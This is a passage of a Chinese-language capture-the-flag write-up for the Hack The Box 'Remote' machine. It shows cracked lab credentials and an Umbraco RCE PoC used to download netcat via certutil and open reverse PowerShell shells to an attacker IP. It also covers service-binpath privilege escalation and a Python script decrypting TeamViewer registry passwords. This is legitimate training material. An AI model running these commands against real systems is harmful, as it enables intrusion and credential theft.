<p><code>-o nolock</code>: 使用 <code>nolock</code> 选项表示禁用文件锁定机制。在某些情况下，NFS 文件系统可能会默认启用文件锁定，但是使用 <code>nolock</code> 选项可以禁用它。</p>
<p>官方给了个提示 <a class="link"   href="https://stackoverflow.com/questions/36979794/umbraco-database-connection-credentials" >这个链接<i class="fas fa-external-link-alt"></i></a>说了UmbracoCMS的密码凭据存放处，是Umbraco.sdf，在App_Data文件夹里</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">strings Umbraco.sdf|grep admin@</span><br></pre></td></tr></table></figure>

<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240408164414.png" ></p>
<p>找到了一串md5，用网站解密，解出来一串是密码</p>
<p> <img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240408164510.png" ></p>
<p>拿着账号密码登陆刚刚的登陆框</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">admin@htb.local:baconandcheese</span><br></pre></td></tr></table></figure>

<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240408164719.png" ></p>
<p>成功登陆后看到这个CMS的版本是7.12.4，在网上能找到相关的RCE漏洞</p>
<p>poc：<a class="link"   href="https://github.com/noraj/Umbraco-RCE.git" >https://github.com/noraj/Umbraco-RCE.git<i class="fas fa-external-link-alt"></i></a></p>
<p>下载下来后尝试命令执行</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240408164903.png" ></p>
<p>是成功的，接下来反弹shell</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 exploit.py -u admin@htb.local -p baconandcheese -i http://10.10.10.180 -c  cmd.exe -a &#x27;/c certutil.exe -urlcache -split -f http://10.10.16.3/nc64.exe C:/Users/Public/nc.exe&#x27;</span><br></pre></td></tr></table></figure>

<p><code>-urlcache</code>: 这个参数告诉 <code>certutil.exe</code> 下载指定 URL 中的内容到本地。</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240408165113.png" ></p>
<p>下载一个nc到靶机，再调用，本地开启监听</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 exploit.py -u admin@htb.local -p baconandcheese -i http://10.10.10.180 -c cmd.exe -a &#x27;/c c:/users/public/nc.exe 10.10.16.3 4444 -e powershell&#x27;</span><br></pre></td></tr></table></figure>

<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240408165355.png" ></p>
<p>成功拿到第一个shell</p>
<h4 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h4><h5 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h5><p>上传辅助工具winPEASx64.exe</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">certutil.exe -urlcache -split -f http://10.10.16.3/winPEASany.exe a.exe</span><br></pre></td></tr></table></figure>

<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240408171454.png" ></p>
<p>发现用户IIS对UsoSvc服务有开启关闭权限</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sc.exe qc UsoSvc # 查询服务详细信息</span><br></pre></td></tr></table></figure>

<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240408171658.png" ></p>
<p>思路是先停止这个服务，然后修改服务中的程序路径，再重启</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. sc.exe stop UsoSvc</span><br><span class="line">2. sc.exe config UsoSvc binpath= &quot;c:/users/public/nc.exe 10.10.16.3 3333 -e powershell&quot;</span><br><span class="line">3. sc.exe start UsoSvc</span><br></pre></td></tr></table></figure>

<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240408172259.png" ></p>
<p>然后本地开启监听，就拿到system权限，这里有个问题是这个shell会很快就断开，可以拿到后再反弹一次</p>
<h5 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h5><p>查找本机所有正在运行的进程以及它们所托管的服务，找到<code>TeamViewer</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tasklist /svc</span><br></pre></td></tr></table></figure>

<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-04-08%2017.30.40.png" ></p>
<p>有一个<a class="link"   href="https://www.cnblogs.com/unicodeSec/p/12294868.html" >CVE-2019-18988<i class="fas fa-external-link-alt"></i></a>，teamviewer将用户名密码硬编码至注册表中，加密算法是：<code>AES-128-CBC</code></p>
<p>其中key的值：0602000000a400005253413100040000，iv的值：0100010067244F436E6762F25EA8D704 是固定的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">reg query HKLM\SOFTWARE\Wow6432Node\TeamViewer\Version7</span><br></pre></td></tr></table></figure>

<p>查看TeamViewer详细信息，找到SecurityPasswordAES<code>的值</code>FF9B1C73D66BCE31AC413EAE131B464F582F6CE2D1E1F3DA7E8D376B26394E5B</p>
<p>用以下脚本解密</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys, hexdump, binascii</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">AESCipher</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, key</span>):</span><br><span class="line">        self.key = key</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">self, iv, data</span>):</span><br><span class="line">        self.cipher = AES.new(self.key, AES.MODE_CBC, iv)</span><br><span class="line">        <span class="keyword">return</span> self.cipher.decrypt(data)</span><br><span class="line"></span><br><span class="line">key = binascii.unhexlify(<span class="string">&quot;0602000000a400005253413100040000&quot;</span>)</span><br><span class="line">iv = binascii.unhexlify(<span class="string">&quot;0100010067244F436E6762F25EA8D704&quot;</span>)</span><br><span class="line">hex_str_cipher = <span class="string">&quot;FF9B1C73D66BCE31AC413EAE131B464F582F6CE2D1E1F3DA7E8D376B26394E5B&quot;</span>            <span class="comment"># output from the registry</span></span><br><span class="line"></span><br><span class="line">ciphertext = binascii.unhexlify(hex_str_cipher)</span><br><span class="line"></span><br><span class="line">raw_un = AESCipher(key).decrypt(iv, ciphertext)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(hexdump.hexdump(raw_un))</span><br><span class="line"></span><br><span class="line">password = raw_un.decode(<span class="string">&#x27;utf-16&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(password)</span><br></pre></td></tr></table></figure>

<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-04-08%2017.57.41.png" ></p>
<p>解出密码:!R3m0te!</p>
<p>测试这个密码能否登陆</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">crackmapexec smb 10.10.10.180 -u administrator -p &#x27;!R3m0te!&#x27;</span><br></pre></td></tr></table></figure>

<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240408174116.png" ></p>
<p>是可以的，然后就用Evil-WinRM登陆，提权成功</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240408174240.png" ></p>
<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>涉及知识点：nfs挂载，poc利用，windows反弹shell，windows提权，TeamViewer提权。。。</p>
<p>整体思路：ftp找不到有用文件–&gt;80端口http服务找到CMS和登陆框–&gt;nfs服务发现文件夹，挂载出来–&gt;找到admin的账号密码–&gt;登陆CMS后发现相关版本–&gt;找到公开漏洞poc进行RCE–&gt;获得一个shell–&gt;自动化提权工具找到UsoSvc提权&#x2F;找到有Teamviewer服务用公开方法解密出脚本登陆adminitrator</p>
<p>总体思路应该算是简单的，思路不曲折，过程中接触到的东西几乎都是新的，所以写下来，以后就了解了。</p>
]]></content>
      <tags>
        <tag>复盘</tag>
        <tag>htb</tag>
        <tag>windows</tag>
      </tags>
  </entry>
</search>
